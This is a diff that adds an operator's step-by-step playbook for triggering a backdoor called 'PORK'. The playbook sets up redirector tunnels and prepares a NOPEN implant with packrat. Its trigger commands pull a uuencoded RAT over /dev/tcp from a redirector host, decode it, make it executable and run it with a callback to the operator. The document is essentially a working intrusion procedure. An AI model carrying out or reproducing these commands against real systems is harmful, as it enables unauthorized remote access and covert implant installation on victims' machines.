@@ -1,0 +1,76 @@
+##### Triggering PORK #####
+
+### Need 4 scripted windows
+### Window 1: local, run pork client
+### Window 2: nopen tunnel window on redirector
+### Window 3: window to establish Nopen connection on redirector
+### Window 4: packrat window
+
+### Search/Replace stuff
+### TARG_IP: box that has pork installed
+### TARG_PORT: pork'ed port
+### REDIR_IP: box hitting TARG_IP
+### NETCAT_PORT: port to upload nopen
+### NOPEN_PORT: port to start nopen on
+### SPECIAL_SOURCE_PORT: source port of connection to pork
+### (source port must be one of: 3, 51, 3854, 5671, 8213, 12634, 16798, 
+                 23247, 35139, 47923, 53246, 63201)
+### TEMP_DIR: temp directory
+### TIME_ADJ: time diff between local GMT and targ GMT (use 0 if no diff)
+### (must be within 12 hrs)
+
+mx
+:%s/TARG_IP/TARG_IP/g
+:%s/TARG_PORT/TARG_PORT/g
+:%s/REDIR_IP/REDIR_IP/g
+:%s/NETCAT_PORT/NETCAT_PORT/g
+:%s/NOPEN_PORT/NOPEN_PORT/g
+:%s/SPECIAL_SOURCE_PORT/SPECIAL_SOURCE_PORT/g
+:%s/TEMP_DIR/TEMP_DIR/g
+:%s/RAT_REMOTE_NAME/RAT_REMOTE_NAME/g
+:%s/TIME_ADJ/TIME_ADJ/g
+'x
+
+
+### Window 2: Set up tunnel to talk to pork
+-tunnel
+r NETCAT_PORT
+
+# If pork'ed service is TCP
+l TARG_PORT TARG_IP TARG_PORT SPECIAL_SOURCE_PORT
+
+# If pork'ed service is UDP
+u TARG_PORT TARG_IP TARG_PORT SPECIAL_SOURCE_PORT
+
+
+### Window 3: If need nopen to call back, set this up
+-nrtun NOPEN_PORT
+
+
+### Window 4: use packrat to prep Nopen
+### Change the Nopen to upload if necessary
+cd /current/up
+packrat -z RAT_REMOTE_NAME morerats/noserver-3.0.3.1-i586-pc-linux-gnu NETCAT_PORT
+
+
+### Window 1: Trigger pork
+### Many ways this command may need to be adjusted to do callback, execute rat,
+### etc., so all possibilities not outlined below
+
+cd /current/bin
+
+# If TCP
+./client -t TIME_ADJ SPECIAL_SOURCE_PORT 127.0.0.1 TARG_PORT "cd /tmp; mkdir TEMP_DIR; cd TEMP_DIR; cat < /dev/tcp/REDIR_IP/REDIR_PORT > RAT_REMOTE_NAME.uu; uudecode RAT_REMOTE_NAME.uu; chmod 700 RAT_REMOTE_NAME; PATH=. S=1 D=-cREDIR_IP:NOPEN_PORT RAT_REMOTE_NAME"
+
+# If UDP
+./client -u TIME_ADJ SPECIAL_SOURCE_PORT 127.0.0.1 TARG_PORT "cd /tmp; mkdir TEMP_DIR; cd TEMP_DIR; cat < /dev/tcp/REDIR_IP/REDIR_PORT > RAT_REMOTE_NAME.uu; uudecode RAT_REMOTE_NAME.uu; chmod 700 RAT_REMOTE_NAME; PATH=. S=1 D=-cREDIR_IP:NOPEN_PORT RAT_REMOTE_NAME"
+
+
+### Window 3: Should see Nopen connection if set up to callback
+### If set up to listen, use this line
+-nstun TARG_IP NOPEN_PORT
+
+
+### Should be able to handle it from here...
+
+
